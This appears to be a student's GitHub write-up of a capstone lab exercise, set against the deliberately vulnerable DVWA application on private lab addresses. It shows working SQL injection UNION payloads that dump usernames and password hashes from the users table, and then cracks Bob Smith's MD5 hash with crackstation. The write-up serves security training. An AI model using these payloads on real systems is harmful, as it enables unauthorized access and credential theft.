# Final-Capstone-Project
Final Capstone Activity from Challenge 1 - 4 using Kali VM, Internet access, crackstation
# Challenge 1: SQL Injection #
*In this part, you must discover user account information on a server and crack the password of Bob Smith's account. You will then locate the file that contains the Challenge 1 code and use Bob Smith's account credentials to open the file at 192.168.0.10 to view its contents.*

### Step 1: Preliminary setup <br>
a. Open a browser and go to the website at 10.5.5.12. <br>
Note: If you have problems reaching the website, remove the https:// prefix from the IP address in the browser address field. <br>

b. Login with the credentials admin / password. <br>

<img width="1366" height="702" alt="dvwa login page" src="https://github.com/user-attachments/assets/deafa907-a0ae-4d1b-b295-ed8e43eaaae7" />

c. Set the DVWA security level to low and click Submit. <br>

<img width="1366" height="702" alt="dvwa security level" src="https://github.com/user-attachments/assets/7639bfe8-f625-4bce-86ee-730bac6d3044" />

### Step 2: Retrieve the user credentials for the Bob Smith's account.
a. Identify the table that contains usernames and passwords. <br>
we do this by using the payload **1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'#**
<img width="1366" height="702" alt="retrieve user names from column tables" src="https://github.com/user-attachments/assets/7f408f9c-6007-4a98-90b2-1ca7e4e05ca1" />

b. Locate a vulnerable input form that will allow you to inject SQL commands. <br>

**ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'# <br>
First name: 1 <br>
Surname: user** <br>

**ID: 1' OR 1=1 UNION SELECT 1,column_name FROM information_schema.columns WHERE table_name='users'# <br>
First name: 1 <>br
Surname: password** <br>

c. Retrieve the username and the password hash for Bob Smith's account. <br>
 Use the payload **1' OR 1=1 UNION SELECT user, password FROM users #** to retrieve username and password hash for Bob Smith's account. <br>
 <img width="1366" height="702" alt="retrieve users credentials" src="https://github.com/user-attachments/assets/6104b8e2-c0e6-42c1-865b-674309238195" />

**ID: 1' OR 1=1 UNION SELECT user, password FROM users # <br>
First name: smithy <br>
Surname: 5f4dcc3b5aa765d61d8327deb882cf99** <br>

### Step 3: Crack Bob Smith's account password.
 *Use any password hash cracking tool desired to crack Bob Smith’s password.* <br>
I will be using **crackstation** to crack the hash by visiting **https://crackstation.net/** <br>
<img width="1366" height="702" alt="crackstation" src="https://github.com/user-attachments/assets/30382856-18db-4419-b916-478a16b744f4" />
i will then input the hash i got from Bob smith account which is **5f4dcc3b5aa765d61d8327deb882cf99**. Check the box **I'm not a robot captcha** and click-on **Crack Hashes** <br>

<img width="1366" height="702" alt="smithy hashes password" src="https://github.com/user-attachments/assets/eb325ca4-8a5c-42c3-bf0d-56aa04357a21" />

